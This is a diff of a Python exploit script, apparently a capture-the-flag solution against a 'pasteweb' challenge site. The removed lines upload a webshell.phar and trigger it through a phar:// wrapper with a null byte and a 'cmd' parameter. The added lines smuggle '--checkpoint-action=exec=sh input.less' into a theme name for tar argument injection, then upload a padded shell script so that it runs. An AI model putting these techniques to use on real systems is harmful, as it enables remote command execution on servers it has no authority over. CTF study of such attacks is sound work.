@@ -1,19 +1,21 @@
 import requests
 from datetime import datetime
-url = "http://192.168.146.130:8888/"
+url = "https://pasteweb.ctf.zoolab.org/"
 sess = requests.session()
 sess.get(url)
 sess.post(url, data={
-    "username":"asef18766",
-    "password":"asef18766",
+    "username":"asef18766_",
+    "password":"asef18766_",
     "current_time":int(datetime.now().timestamp())
 })
-def upload_css():
-    with sess.post(f"{url}/edithtml.php", data={"html":open("webshell.phar", "rb").read()}) as resp:
+def upload_css(theme:str, less:str):
+    with sess.post(f"{url}/editcss.php", data={
+            "less":less,
+            "theme":theme
+        }) as resp:
         print(resp.status_code)
         print(resp.text)
-def get_view():
-    with sess.get(f"{url}/view.php", params={"theme":"phar://index.html\x00", "cmd":"ls"}) as resp:
-        print(resp.text)
-#upload_css()
-get_view()
+print("===== create checkpint cmd =====")
+upload_css('--checkpoint-action=exec=sh input.less ', "p {}")
+print("===== upload shell script =====")
+upload_css("meow", open("shellscript.sh", "r").read()+"#"+"a"*10*20*512) # 10 record by default, each record 20*512 bytes
